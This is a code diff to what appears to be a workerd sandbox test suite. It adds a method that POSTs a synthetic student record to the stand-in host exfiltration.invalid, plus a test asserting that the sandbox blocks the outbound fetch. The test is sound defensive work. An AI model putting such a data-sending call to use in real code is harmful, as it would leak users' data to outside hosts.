@@ -29,6 +29,18 @@ export class Gadget extends DurableObject {
     return "hi";
   }
 
+  async attemptExfiltration() {
+    try {
+      await fetch("https://exfiltration.invalid/student", {
+        method: "POST",
+        body: "synthetic-student-record",
+      });
+    } catch (error) {
+      return error.message;
+    }
+    return "outbound fetch unexpectedly succeeded";
+  }
+
   mintCallback(tag) {
     return this.ctx.restore({ type: "callback", tag });
   }
@@ -71,6 +83,16 @@ async function withGadget(fn: (impl: any) => Promise<void>): Promise<void> {
 }
 
 describe("gadget ctx.restore()", () => {
+  it("refuses direct public-network fetch from untrusted Gadget JavaScript",
+      () => withGadget(async impl => {
+    // Exercises loadGadgetWorker's globalOutbound: null in the real workerd sandbox.
+    // No connector or capability-policy decision is involved; use synthetic data only.
+    using gadget = await impl.getGadgetFacet(GADGET_ID);
+    expect(await gadget.attemptExfiltration()).toContain(
+        "This worker is not permitted to access the internet");
+    expect(await gadget.hello()).toBe("hi");
+  }));
+
   it("works through the stub getGadgetFacet hands out, and the result survives storage",
       () => withGadget(async impl => {
     using gadget = await impl.getGadgetFacet(GADGET_ID);
